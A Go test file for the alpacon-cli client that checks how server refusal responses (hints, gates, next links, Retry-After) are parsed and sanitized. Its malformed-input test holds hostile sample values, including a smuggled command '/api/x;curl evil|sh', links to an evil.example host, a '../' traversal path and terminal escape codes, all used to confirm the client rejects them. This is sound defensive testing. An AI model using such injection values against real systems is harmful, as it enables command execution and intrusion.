package client

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/alpacax/alpacon-cli/pkg/testutil"
	"github.com/alpacax/alpacon-cli/utils"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// sendRefusal answers one request with status and body and returns the error
// the client made of it.
func sendRefusal(t *testing.T, status int, body string) error {
	t.Helper()
	return sendRefusalWithRetryAfter(t, status, "", body)
}

// sendRefusalWithRetryAfter is sendRefusal with a Retry-After header, none when empty.
func sendRefusalWithRetryAfter(t *testing.T, status int, retryAfter, body string) error {
	t.Helper()
	return sendRefusalFrom(t, newTestClient, status, retryAfter, body)
}

func newBearerClient(url string) *AlpaconClient { return newBearerTestClient(url, "access") }

func sendRefusalFrom(t *testing.T, newClient func(string) *AlpaconClient, status int, retryAfter, body string) error {
	t.Helper()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if retryAfter != "" {
			w.Header().Set("Retry-After", retryAfter)
		}
		w.WriteHeader(status)
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(ts.Close)

	_, err := newClient(ts.URL).SendGetRequest("/api/test/")
	require.Error(t, err)
	return err
}

func TestSendRequest_RefusalHintIsCarriedOnEveryRefusalStatus(t *testing.T) {
	t.Parallel()
	const hint = "This token does not hold a scope this action needs; use a token that has the scope, then retry."
	tests := []struct {
		name   string
		status int
		body   string
	}{
		{
			name:   "403 through the auth status path",
			status: http.StatusForbidden,
			body:   `{"code": "api_token_scope_missing", "gate": "token_scope", "missing": ["scope:server:create"], "hint": "` + hint + `"}`,
		},
		{
			name:   "402 plan refusal",
			status: http.StatusPaymentRequired,
			body:   `{"code": "server_limit_exceeded", "gate": "plan", "axis": "server", "hint": "` + hint + `"}`,
		},
		{
			name:   "405 refusal",
			status: http.StatusMethodNotAllowed,
			body:   `{"code": "workspace_put_info_disabled", "hint": "` + hint + `"}`,
		},
		{
			name:   "429 refusal",
			status: http.StatusTooManyRequests,
			body:   `{"code": "api_rate_limited", "gate": "rate", "hint": "` + hint + `"}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusal(t, tt.status, tt.body)

			assert.Equal(t, hint, utils.RefusalHint(err))
			assert.Equal(t, []utils.NextAction{{Description: hint}}, utils.RefusalNextActions(err))
			// The hint is part of the envelope, so it must not leak into the
			// message as if it were a field error.
			assert.NotContains(t, err.Error(), "hint:")
			assert.NotContains(t, err.Error(), "gate:")
		})
	}
}

func TestSendRequest_RefusalWithoutHintKeepsTodaysOutput(t *testing.T) {
	t.Parallel()
	// A server that predates the field sends none: no guidance is added and the
	// message is what it was.
	err := sendRefusal(t, http.StatusForbidden, `{"code": "api_token_scope_missing", "gate": "token_scope", "missing": ["scope:server:create"]}`)

	assert.Empty(t, utils.RefusalHint(err))
	assert.Nil(t, utils.RefusalNextActions(err))
	assert.Equal(t, "permission denied: missing scope scope:server:create", err.Error())
}

func TestSendRequest_HintOutsideARefusalIsAFieldError(t *testing.T) {
	t.Parallel()
	// A 400 field named "hint" is a validation message about the request, not
	// the server's guidance.
	err := sendRefusal(t, http.StatusBadRequest, `{"hint": ["This field may not be blank."]}`)

	assert.Empty(t, utils.RefusalHint(err))
	assert.Equal(t, "hint: This field may not be blank.", err.Error())
}

func TestSendRequest_RefusalHintIsSanitized(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		hint string
		want string
	}{
		{
			name: "control characters and escapes are removed",
			hint: `Open a work\n session.\u001b[2K\r\t\u009b\u202e`,
			want: "Open a work session.",
		},
		{
			name: "an over-long hint is cut to the byte cap",
			hint: strings.Repeat("x", 300),
			want: strings.Repeat("x", utils.MaxServerHintBytes),
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusal(t, http.StatusForbidden, `{"code": "permission_denied", "hint": "`+tt.hint+`"}`)

			assert.Equal(t, tt.want, utils.RefusalHint(err))
		})
	}
}

// A server hint is the guidance, so the CLI's own per-code sentence gives way
// to it and the message only identifies the refusal; without a hint the local
// sentence stays.
func TestSendRequest_ServerHintReplacesTheLocalSentence(t *testing.T) {
	t.Parallel()
	const hint = "Use the web console for this change."
	tests := []struct {
		name       string
		status     int
		code       string
		local      string
		wantHinted string
	}{
		{
			name:       "403 code from the auth status table",
			status:     http.StatusForbidden,
			code:       utils.ApprovalPolicyConsoleOnly,
			local:      "approval policies can only be created, changed or deleted from the web console",
			wantHinted: "permission denied (HTTP 403, code: approval_policy_console_only)",
		},
		{
			name:       "405 code from the code-only table",
			status:     http.StatusMethodNotAllowed,
			code:       utils.CommandACLMoved,
			local:      "command pre-approval ledger",
			wantHinted: "request refused (HTTP 405, code: command_acl_moved)",
		},
		{
			name:       "429 code from the code-only table",
			status:     http.StatusTooManyRequests,
			code:       utils.APIRateLimited,
			local:      "too many requests—please try again later",
			wantHinted: "request refused (HTTP 429, code: api_rate_limited)",
		},
		{
			name:       "403 code with no local sentence falls from the generic floor",
			status:     http.StatusForbidden,
			code:       "user_no_permission",
			local:      "permission denied: you do not have the required privileges for this action",
			wantHinted: "permission denied (HTTP 403, code: user_no_permission)",
		},
	}
	for _, code := range []string{
		utils.WorkSessionSudoBypassConsoleOnly, utils.WorkSessionSessionAuthorizedSudoConsoleOnly,
		utils.SudoPolicyBypassAgentSessionNeedsPresence, utils.SudoPolicySessionAuthorizedAgentSessionNeedsPresence,
		utils.SudoPolicyBypassAgentSessionNeedsApproval, utils.SudoPolicySessionAuthorizedAgentSessionNeedsApproval,
	} {
		tests = append(tests, struct {
			name       string
			status     int
			code       string
			local      string
			wantHinted string
		}{code, http.StatusForbidden, code, "session-authorized sudo", "permission denied (HTTP 403, code: " + code + ")"})
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			hinted := sendRefusal(t, tt.status, `{"code": "`+tt.code+`", "hint": "`+hint+`"}`)
			assert.Equal(t, tt.wantHinted, hinted.Error())
			assert.NotContains(t, hinted.Error(), tt.local)
			assert.Equal(t, hint, utils.RefusalHint(hinted))

			plain := sendRefusal(t, tt.status, `{"code": "`+tt.code+`"}`)
			assert.Contains(t, plain.Error(), tt.local)
			assert.Empty(t, utils.RefusalHint(plain))
		})
	}
}

// What a user reads: the hint once, under an Error line that names the
// refusal, and not the local sentence.
func TestCliError_ShowsTheServerHintOnceInPlaceOfTheLocalSentence(t *testing.T) {
	const hint = "Approval policies can be read and changed only from the web console; use the console instead."
	const local = "approval policies can only be created"

	hinted := sendRefusal(t, http.StatusForbidden, `{"code": "approval_policy_console_only", "hint": "`+hint+`"}`)
	_, stderr := testutil.CaptureOutput(t, func() { utils.CliError("failed to update the policy: %s", hinted) })
	assert.Equal(t, 1, strings.Count(stderr, hint), "stderr: %q", stderr)
	assert.Contains(t, stderr, "code: approval_policy_console_only")
	assert.NotContains(t, stderr, local)

	plain := sendRefusal(t, http.StatusForbidden, `{"code": "approval_policy_console_only"}`)
	_, stderr = testutil.CaptureOutput(t, func() { utils.CliError("failed to update the policy: %s", plain) })
	assert.Contains(t, stderr, local)
	assert.NotContains(t, stderr, "Hint:")
}

func TestSendRequest_ServerHintReplacesThePlanRemedy(t *testing.T) {
	t.Parallel()
	const hint = "The workspace has reached its plan's server limit; it needs a free slot or a plan with a higher limit."
	limit := `{"code": "server_limit_exceeded", "gate": "plan", "axis": "server"`

	hinted := sendRefusal(t, http.StatusPaymentRequired, limit+`, "hint": "`+hint+`"}`)
	assert.Equal(t, "plan limit reached: servers. Upgrade: "+selfHostedBillingWords+". Talk to us: "+talkToUsURL, hinted.Error())
	assert.Equal(t, hint, utils.RefusalHint(hinted))

	plain := sendRefusal(t, http.StatusPaymentRequired, limit+`}`)
	assert.Contains(t, plain.Error(), countCapRemedy)
	assert.Contains(t, plain.Error(), serverAxisReregisterHint)

	lock := `{"code": "workspace_plan_update_required", "gate": "plan"`
	hintedLock := sendRefusal(t, http.StatusPaymentRequired, lock+`, "hint": "The workspace's plan does not include this; it needs a plan that does."}`)
	assert.Equal(t, "request refused (HTTP 402, code: workspace_plan_update_required). Upgrade: "+selfHostedBillingWords+". Talk to us: "+talkToUsURL, hintedLock.Error())

	plainLock := sendRefusal(t, http.StatusPaymentRequired, lock+`}`)
	assert.Contains(t, plainLock.Error(), featureLockSentence)
}

// The reset day comes from Retry-After, which the hint cannot carry, so it
// stays beside the hint.
func TestPlanLimitMessage_ServerHintKeepsTheResetDay(t *testing.T) {
	t.Parallel()
	message, ok := planLimitMessage("websh", "websh_limit_exceeded", utils.GatePlan, 3*24*time.Hour, "https://my-ws.zz9.alpacon.io", true)
	require.True(t, ok)
	assert.Equal(t, "plan limit reached: Websh hours this month. Resets in 3 days. Upgrade: https://alpacon.io/my-ws/settings/billing. Talk to us: "+talkToUsURL, message)
}

// A refusal body that is not envelope-only, such as a 405 that also carries
// "next", still keeps its hint out of the field-error text: the hint reaches
// the output once, sanitized, through the Hint line.
func TestSendRequest_RefusalHintNeverRendersAsAFieldError(t *testing.T) {
	tests := []struct {
		name     string
		hint     string
		wantHint string
		rawPart  string
	}{
		{
			name:     "a plain hint",
			hint:     "The workspace's details take partial updates only; send the change as a PATCH instead.",
			wantHint: "The workspace's details take partial updates only; send the change as a PATCH instead.",
			rawPart:  "partial updates only",
		},
		{
			name:     "a hint with a newline",
			hint:     `Send a PATCH.\nError: forged`,
			wantHint: "Send a PATCH.Error: forged",
			rawPart:  "forged",
		},
		{
			name:     "an over-long hint",
			hint:     strings.Repeat("y", 300),
			wantHint: strings.Repeat("y", utils.MaxServerHintBytes),
			rawPart:  "yyyy",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := sendRefusal(t, http.StatusMethodNotAllowed,
				`{"code": "workspace_put_info_disabled", "next": "/api/workspaces/info/", "hint": "`+tt.hint+`"}`)

			assert.NotContains(t, err.Error(), "hint")
			assert.NotContains(t, err.Error(), tt.rawPart)
			assert.Equal(t, tt.wantHint, utils.RefusalHint(err))

			_, stderr := testutil.CaptureOutput(t, func() { utils.CliError("failed: %s", err) })
			assert.Equal(t, 1, strings.Count(stderr, tt.wantHint), "stderr: %q", stderr)
			assert.NotContains(t, stderr, "\nError: forged")
		})
	}
}

// Outside a refusal status, a "hint" field is a validation message about the
// request and still renders as one, whatever else the body holds.
func TestSendRequest_HintFieldOnAValidationErrorStillRenders(t *testing.T) {
	t.Parallel()
	err := sendRefusal(t, http.StatusBadRequest, `{"code": "invalid_input", "hint": "This field may not be blank."}`)
	assert.Equal(t, "hint: This field may not be blank.", err.Error())
	assert.Empty(t, utils.RefusalHint(err))
}

// A file download answered with a refusal status keeps the code and hint the
// shared parser reads, rather than leaving the caller the raw body.
func TestSendGetRequestForDownload_RefusalKeepsTheHint(t *testing.T) {
	t.Parallel()
	const hint = "The workspace's plan does not include this; it needs a plan that does."
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusPaymentRequired)
		_, _ = w.Write([]byte(`{"code": "workspace_plan_update_required", "gate": "plan", "hint": "` + hint + `"}`))
	}))
	defer ts.Close()

	resp, err := newTestClient(ts.URL).SendGetRequestForDownload("/api/packages/python/x/download/")
	require.Error(t, err)
	assert.Nil(t, resp)
	assert.Equal(t, http.StatusPaymentRequired, utils.HTTPStatusCode(err))
	assert.Equal(t, hint, utils.RefusalHint(err))
	assert.NotContains(t, err.Error(), "hint")
}

func TestSendRequest_HintedRefusalCodeDisplay(t *testing.T) {
	t.Parallel()
	err := sendRefusal(t, http.StatusForbidden, `{"code":"permission_\u001b[2Jdenied","hint":"Retry later."}`)

	assert.Equal(t, "permission denied (HTTP 403, code: permission_denied)", err.Error())
	assert.Equal(t, "permission_\x1b[2Jdenied", utils.StructuredErrorCode(err))
	assert.Equal(t, "Retry later.", utils.RefusalHint(err))
}

func TestSendRequest_RefusalWithGateAndMissingNamesBothInOneLine(t *testing.T) {
	t.Parallel()
	const hint = "Ask an admin for the role."
	tests := []struct {
		name        string
		status      int
		body        string
		wantMessage string
	}{
		{
			name:        "403 gate and missing with a hint",
			status:      http.StatusForbidden,
			body:        `{"code": "rbac_permission_required", "gate": "role", "missing": ["role", "approval"], "hint": "` + hint + `"}`,
			wantMessage: "permission denied by the role gate (HTTP 403, code: rbac_permission_required): missing role, approval",
		},
		{
			name:        "429 unknown code with a gate",
			status:      http.StatusTooManyRequests,
			body:        `{"code": "future_throttle", "gate": "rate"}`,
			wantMessage: "request refused by the rate gate (HTTP 429, code: future_throttle)",
		},
		{
			name:        "405 unknown code with a gate and missing",
			status:      http.StatusMethodNotAllowed,
			body:        `{"code": "future_denied", "gate": "approval", "missing": "approval"}`,
			wantMessage: "request refused by the approval gate (HTTP 405, code: future_denied): missing approval",
		},
		{
			name:        "402 non plan gate with an unknown code",
			status:      http.StatusPaymentRequired,
			body:        `{"code": "future_denied", "gate": "role", "missing": "role"}`,
			wantMessage: "request refused by the role gate (HTTP 402, code: future_denied): missing role",
		},
		{
			name:        "a hint on a known code keeps the gate in the line",
			status:      http.StatusTooManyRequests,
			body:        `{"code": "api_rate_limited", "gate": "rate", "hint": "` + hint + `"}`,
			wantMessage: "request refused by the rate gate (HTTP 429, code: api_rate_limited)",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusal(t, tt.status, tt.body)

			assert.Equal(t, tt.status, utils.HTTPStatusCode(err))
			assert.Equal(t, tt.wantMessage, err.Error())
		})
	}
}

func TestSendRequest_GateOutsideARefusalStatusKeepsTodaysMessage(t *testing.T) {
	t.Parallel()
	err := sendRefusal(t, http.StatusConflict, `{"code": "future_conflict", "gate": "role"}`)

	assert.Equal(t, http.StatusConflict, utils.HTTPStatusCode(err))
	assert.Equal(t, "request failed (code: future_conflict)", err.Error())
}

func TestSendRequest_ForbiddenWithGateAndHintLeadsWithTheHint(t *testing.T) {
	t.Parallel()
	const hint = "Ask an admin for the role."
	err := sendRefusal(t, http.StatusForbidden, `{"code": "rbac_permission_required", "gate": "role", "missing": "role", "hint": "`+hint+`"}`)

	assert.Equal(t, "permission denied by the role gate (HTTP 403, code: rbac_permission_required): missing role", err.Error())
	assert.Equal(t, []utils.NextAction{{Description: hint}}, utils.RefusalNextActions(err))
}

func TestSendRequest_RefusalWithNextIsNotAFieldDump(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name        string
		status      int
		body        string
		wantMessage string
	}{
		{
			name:        "403",
			status:      http.StatusForbidden,
			body:        `{"code": "future_denied", "gate": "approval", "next": "/api/approvals/7/"}`,
			wantMessage: "permission denied by the approval gate (HTTP 403, code: future_denied)",
		},
		{
			name:        "429",
			status:      http.StatusTooManyRequests,
			body:        `{"code": "api_rate_limited", "next": "/api/approvals/7/"}`,
			wantMessage: "too many requests—please try again later",
		},
		{
			name:        "402",
			status:      http.StatusPaymentRequired,
			body:        `{"code": "future_denied", "next": "/api/approvals/7/"}`,
			wantMessage: "request failed (code: future_denied)",
		},
		{
			name:        "405",
			status:      http.StatusMethodNotAllowed,
			body:        `{"code": "future_denied", "gate": "approval", "next": "/api/approvals/7/"}`,
			wantMessage: "request refused by the approval gate (HTTP 405, code: future_denied)",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusalFrom(t, newBearerClient, tt.status, "", tt.body)

			assert.Equal(t, tt.status, utils.HTTPStatusCode(err))
			assert.Equal(t, tt.wantMessage, err.Error())
			assert.Equal(t, []utils.NextAction{{
				Command:     "alpacon api /api/approvals/7/",
				Description: "Where the server says to check on this refusal",
			}}, utils.RefusalNextActions(err))
		})
	}
}

func TestSendRequest_PlanLimitNextIsShownAsTheEntitlementsRead(t *testing.T) {
	t.Parallel()
	err := sendRefusalFrom(t, newBearerClient, http.StatusPaymentRequired, "", `{"code": "server_limit_exceeded", "gate": "plan", "axis": "server", "next": "/api/workspaces/workspaces/abc/entitlements/"}`)

	assert.Equal(t, http.StatusPaymentRequired, utils.HTTPStatusCode(err))
	assert.Equal(t, []utils.NextAction{{
		Command:     "alpacon api /api/workspaces/workspaces/abc/entitlements/",
		Description: "Where the server says to check on this refusal",
	}}, utils.RefusalNextActions(err))
}

func TestSendRequest_APITokenLoginShowsNextAsTextOnly(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name   string
		status int
		body   string
	}{
		{name: "plan limit", status: http.StatusPaymentRequired, body: `{"code": "server_limit_exceeded", "gate": "plan", "axis": "server", "next": "/api/workspaces/workspaces/abc/entitlements/"}`},
		{name: "forbidden", status: http.StatusForbidden, body: `{"code": "future_denied", "gate": "approval", "next": "/api/workspaces/workspaces/abc/entitlements/"}`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusal(t, tt.status, tt.body)

			assert.Equal(t, tt.status, utils.HTTPStatusCode(err))
			assert.Equal(t, []utils.NextAction{{
				Description: "Where the server says to check on this refusal, which an API token cannot read: /api/workspaces/workspaces/abc/entitlements/",
			}}, utils.RefusalNextActions(err))
		})
	}
}

func TestSendRequest_NextOutsideARefusalYieldsNoAction(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name        string
		status      int
		body        string
		wantMessage string
	}{
		{
			name:        "400 field of that name",
			status:      http.StatusBadRequest,
			body:        `{"code": "validation_error", "next": "/api/approvals/7/"}`,
			wantMessage: "next: /api/approvals/7/",
		},
		{
			name:        "401",
			status:      http.StatusUnauthorized,
			body:        `{"code": "auth_mfa_required", "next": "/api/approvals/7/"}`,
			wantMessage: "",
		},
		{
			name:        "429 list next is a field error",
			status:      http.StatusTooManyRequests,
			body:        `{"code": "api_rate_limited", "next": ["Must be a valid choice."]}`,
			wantMessage: "next: Must be a valid choice.",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusal(t, tt.status, tt.body)

			assert.Equal(t, tt.status, utils.HTTPStatusCode(err))
			if tt.wantMessage != "" {
				assert.Equal(t, tt.wantMessage, err.Error())
			}
			assert.Nil(t, utils.RefusalNextActions(err))
		})
	}
}

func TestSendRequest_SignerRefusalDropsNext(t *testing.T) {
	t.Parallel()
	signer := func(url string) *AlpaconClient {
		ac := newTestClient(url)
		ac.dropsRefusalNext = true
		return ac
	}

	err := sendRefusalFrom(t, signer, http.StatusForbidden, "", `{"code": "future_denied", "gate": "approval", "next": "/api/approvals/7/"}`)

	assert.Equal(t, http.StatusForbidden, utils.HTTPStatusCode(err))
	assert.Nil(t, utils.RefusalNextActions(err))
}

func TestSendGetRequestForDownload_SignerRefusalDropsNext(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name   string
		status int
	}{
		{name: "forbidden", status: http.StatusForbidden},
		{name: "too many requests", status: http.StatusTooManyRequests},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(tt.status)
				_, _ = w.Write([]byte(`{"code": "future_denied", "gate": "approval", "next": "/api/approvals/7/"}`))
			}))
			defer ts.Close()
			ac := newTestClient(ts.URL)
			ac.dropsRefusalNext = true

			resp, err := ac.SendGetRequestForDownload("/api/test/")
			if resp != nil {
				_ = resp.Body.Close()
			}

			require.Error(t, err)
			assert.Equal(t, tt.status, utils.HTTPStatusCode(err))
			assert.Nil(t, utils.RefusalNextActions(err))
		})
	}
}

func TestSendRequest_MalformedNextYieldsNoAction(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		next string
	}{
		{name: "protocol relative", next: `//evil.example/x`},
		{name: "absolute URL", next: `https://evil.example/x`},
		{name: "backslash", next: `/a\\b`},
		{name: "control characters", next: `/a\u001b[2Kb`},
		{name: "newline", next: `/a\nb`},
		{name: "over long", next: "/" + strings.Repeat("a", utils.MaxServerHintBytes)},
		{name: "shell metacharacters", next: `/api/x;curl evil|sh`},
		{name: "space", next: `/api/x y/`},
		{name: "dot dot segment", next: `/api/../etc/`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusal(t, http.StatusForbidden, `{"code": "future_denied", "gate": "approval", "next": "`+tt.next+`"}`)

			assert.Nil(t, utils.RefusalNextActions(err))
		})
	}
}

func TestSendRequest_RetryAfterActionNeedsAGateOtherThanPlan(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name       string
		status     int
		retryAfter string
		body       string
		want       []utils.NextAction
	}{
		{
			name:       "429 with the rate gate",
			status:     http.StatusTooManyRequests,
			retryAfter: "30",
			body:       `{"code": "api_rate_limited", "gate": "rate"}`,
			want:       []utils.NextAction{{Description: "Retry after 30s"}},
		},
		{
			name:       "403 with the approval gate",
			status:     http.StatusForbidden,
			retryAfter: "30",
			body:       `{"code": "future_denied", "gate": "approval"}`,
			want:       []utils.NextAction{{Description: "Retry after 30s"}},
		},
		{
			name:       "429 with the rate gate and an HTTP date",
			status:     http.StatusTooManyRequests,
			retryAfter: "Wed, 21 Oct 2026 07:28:00 GMT",
			body:       `{"code": "api_rate_limited", "gate": "rate"}`,
		},
		{
			name:       "429 without a gate",
			status:     http.StatusTooManyRequests,
			retryAfter: "30",
			body:       `{"code": "api_rate_limited"}`,
		},
		{
			name:       "402 with the plan gate",
			status:     http.StatusPaymentRequired,
			retryAfter: "864000",
			body:       `{"code": "server_limit_exceeded", "gate": "plan", "axis": "server"}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusalWithRetryAfter(t, tt.status, tt.retryAfter, tt.body)

			assert.Equal(t, tt.want, utils.RefusalNextActions(err))
		})
	}
}

func TestSendRequest_OlderServerRefusalsKeepTodaysOutput(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name        string
		status      int
		body        string
		wantMessage string
	}{
		{
			name:        "403 with only a code",
			status:      http.StatusForbidden,
			body:        `{"code": "user_no_permission"}`,
			wantMessage: "permission denied: you do not have the required privileges for this action",
		},
		{
			name:        "429 with only a code",
			status:      http.StatusTooManyRequests,
			body:        `{"code": "api_rate_limited"}`,
			wantMessage: "too many requests—please try again later",
		},
		{
			name:        "429 with an unknown code",
			status:      http.StatusTooManyRequests,
			body:        `{"code": "future_throttle"}`,
			wantMessage: "request failed (code: future_throttle)",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := sendRefusal(t, tt.status, tt.body)

			assert.Equal(t, tt.wantMessage, err.Error())
			assert.Nil(t, utils.RefusalNextActions(err))
		})
	}
}
